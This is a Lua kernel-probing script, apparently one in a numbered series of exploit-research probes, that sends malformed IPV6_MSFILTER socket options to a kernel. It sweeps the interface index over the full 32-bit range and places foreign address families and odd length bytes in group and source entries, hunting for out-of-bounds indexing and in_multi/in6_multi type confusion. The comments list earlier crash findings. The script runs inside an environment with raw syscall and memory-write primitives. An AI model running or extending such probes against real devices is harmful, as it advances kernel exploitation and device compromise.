-- CRASH_CLASS: MODERATE
-- PROBE 1433a: MSFILTER ifindex and address-family confusion
--
-- 1432a settled the copy mechanics: getsockopt(41,74) writes claim*128 bytes of
-- kernel-selected data (the group's filter list, zero padded), and the padding is
-- zero-initialised rather than recycled heap.  The bytes are therefore not ours to
-- steer -- but the *index* still might be.
--
-- Three unchecked-index patterns have already turned up in this kernel
-- (sys 667 [r12+2] indexing a dword array, sys 622's signed struct index, sys 653's
-- proc+0x5d0 pool id), all on a field the caller supplies.  IPV6_MSFILTER carries
-- one such field: msfr_ifindex.  Every probe so far passed 1.
--
-- [A]/[B] sweep ifindex over the full 32-bit range on both directions.
-- [C] puts a non-IPv6 family in the group sockaddr_storage of an AF_INET6 socket --
--     the classic cross-family confusion (in_multi vs in6_multi), never tried here.
-- [D] same for the source entries: family 0/2/255, ss_len 0/255.
--
-- Every call is preceded by a heartbeat line, so if the process dies the last
-- printed tag names the shape that killed it.
--
-- Prior art:
--   1427a results/phase36_realargs/1427a_msfilter_readback_20261109_162242.txt
--   1428a .../1428a_msfilter_readback_count_20261109_162635.txt
--   1429a .../1429a_msfilter_overread_20261109_162726.txt
--   1432a .../1432a_msfilter_tail_reuse_20261109_163702.txt
--   50f results/phase11_network_attacks/50f_ipv6_msfilter_aligned_20261022_183727.txt

print("=== PROBE 1433a: MSFILTER IFINDEX + FAMILY CONFUSION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function sc(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function es()
    local ok, s = pcall(function() return get_error_string() end)
    if ok and type(s) == "string" then return s end
    return "errno?"
end
local function z(p, n) for i = 0, n - 1 do memory.write_byte(p + i, 0) end end
local function b(p, i, v) memory.write_byte(p + i, v) end
local function d(p, i, v) memory.write_dword(p + i, v) end
local function rd(p, i) return to_num(memory.read_dword(p + i)) end

local AF_INET6, SOCK_DGRAM, IPPROTO_UDP, IPPROTO_IPV6 = 28, 2, 17, 41
local JOIN, MSFILTER = 12, 74
local socket, getsockopt, setsockopt = sc(97), sc(118), sc(105)

local function map(len, prot)
    local va = to_num(sc(477)(uint64(0), uint64(len), uint64(prot or 3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)))
    if va < 0x10000 or va > 0x8000000000 then return nil end
    return va
end

local sock = -1            -- declared before the helpers: Lua binds upvalues at compile time
local req = memory.alloc(0x100)
local glen = memory.alloc(16)
local src = map(0x10000)
local dst = map(0x4000)
assert(src and dst, "mmap failed")

-- ix      : msfr_ifindex
-- gfam    : family byte written into the group sockaddr_storage
-- slen    : ss_len byte of the group
-- sfam    : family byte of source entry 0 (0 = leave the v6 default)
-- sslen   : ss_len of source entry 0 (0 = leave the default)
local function prep(ix, gfam, slen, sfam, sslen)
    z(req, 160)
    d(req, 0, ix)
    d(req, 4, 1)              -- INCLUDE
    d(req, 8, 1)              -- one source
    b(req, 16, slen or 28)
    b(req, 17, gfam or AF_INET6)
    b(req, 24, 0xff); b(req, 25, 0x02); b(req, 39, 0x55)
    d(req, 40, 1)             -- scope id
    memory.write_qword(req + 144, uint64(src))
    z(src, 256)
    b(src, 0, sslen or 28)
    b(src, 1, sfam or AF_INET6)
    b(src, 8, 0x20); b(src, 9, 0x01)
    b(src, 22, 0x20); b(src, 23, 0x01)
    d(src, 24, 1)
end

local function do_get(ix, gfam, slen)
    prep(ix, gfam, slen)
    d(glen, 0, 152)
    local rv = -999
    local ok, r = pcall(function()
        return getsockopt(uint64(sock), uint64(IPPROTO_IPV6), uint64(MSFILTER),
            uint64(req), uint64(glen), uint64(0))
    end)
    if ok then rv = to_num(r) else return "EXC", 0 end
    return rv, rd(req, 8)
end

local function do_set(ix, gfam, slen, sfam, sslen)
    prep(ix, gfam, slen, sfam, sslen)
    local rv = -999
    local ok, r = pcall(function()
        return setsockopt(uint64(sock), uint64(IPPROTO_IPV6), uint64(MSFILTER),
            uint64(req), uint64(152), uint64(0))
    end)
    if ok then rv = to_num(r) else return "EXC" end
    return rv
end

local function join(tag)
    local m = memory.alloc(32)
    z(m, 32)
    b(m, 0, 0xff); b(m, 1, 0x02); b(m, 15, tag)
    d(m, 16, 1)
    local rv = -999
    local ok, r = pcall(function()
        return setsockopt(uint64(sock), uint64(IPPROTO_IPV6), uint64(JOIN), uint64(m), uint64(20))
    end)
    if ok then rv = to_num(r) end
    return rv
end

sock = to_num(socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
print(string.format("socket=%d join(ff02::55)=%d", sock, join(0x55)))
print("")

-- ---------------------------------------------------------------------
print("[A] ifindex sweep on getsockopt(41,74), claim=1")
local idxs = {0, 1, 2, 3, 4, 0x10, 0xFF, 0xFFFF, 0x10000, 0x1000000,
              0x7FFFFFFF, 0xFFFFFFFF}
for _, ix in ipairs(idxs) do
    print(string.format("  GET ix=0x%08X ...", ix))
    local rv, ns = do_get(ix)
    print(string.format("    rv=%s numsrc=%s", tostring(rv), tostring(ns)))
end
print("")

-- ---------------------------------------------------------------------
print("[B] ifindex sweep on setsockopt(41,74), 1 source")
for _, ix in ipairs(idxs) do
    print(string.format("  SET ix=0x%08X ...", ix))
    print(string.format("    rv=%s", tostring(do_set(ix))))
end
-- restore a known-good filter on this group
print(string.format("  SET ix=1 re-arm -> %s", tostring(do_set(1, nil, nil, nil, nil))))
print("")

-- ---------------------------------------------------------------------
print("[C] group family confusion: AF_INET6 socket, foreign family in msfr_group")
local fams = {0, 1, 2, 28, 255}
for _, gf in ipairs(fams) do
    print(string.format("  GET group family=%d len=28 ...", gf))
    local rv, ns = do_get(1, gf, 28)
    print(string.format("    rv=%s numsrc=%s", tostring(rv), tostring(ns)))
end
for _, gl in ipairs({0, 1, 16, 28, 255}) do
    print(string.format("  GET group family=28 len=%d ...", gl))
    local rv, ns = do_get(1, AF_INET6, gl)
    print(string.format("    rv=%s numsrc=%s", tostring(rv), tostring(ns)))
end
print(string.format("  SET group family=2 (AF_INET in a v6 call) ..."))
print(string.format("    rv=%s", tostring(do_set(1, 2, 28))))
print(string.format("  SET group family=255 ..."))
print(string.format("    rv=%s", tostring(do_set(1, 255, 28))))
print("")

-- ---------------------------------------------------------------------
print("[D] source-entry family confusion")
for _, sf in ipairs({0, 1, 2, 28, 255}) do
    print(string.format("  SET source family=%d ...", sf))
    print(string.format("    rv=%s", tostring(do_set(1, nil, nil, sf, 28))))
end
for _, sl in ipairs({0, 1, 16, 28, 255}) do
    print(string.format("  SET source ss_len=%d ...", sl))
    print(string.format("    rv=%s", tostring(do_set(1, nil, nil, AF_INET6, sl))))
end
print("")

-- ---------------------------------------------------------------------
print("[E] survivor check: the group must still answer cleanly")
print(string.format("  GET ix=1 claim=1 -> rv=%s numsrc=%s", tostring(do_get(1)), tostring(0)))
local rv, ns = do_get(1)
print(string.format("  final rv=%s numsrc=%s", tostring(rv), tostring(ns)))

print("")
print("=== PROBE 1433a COMPLETE ===")
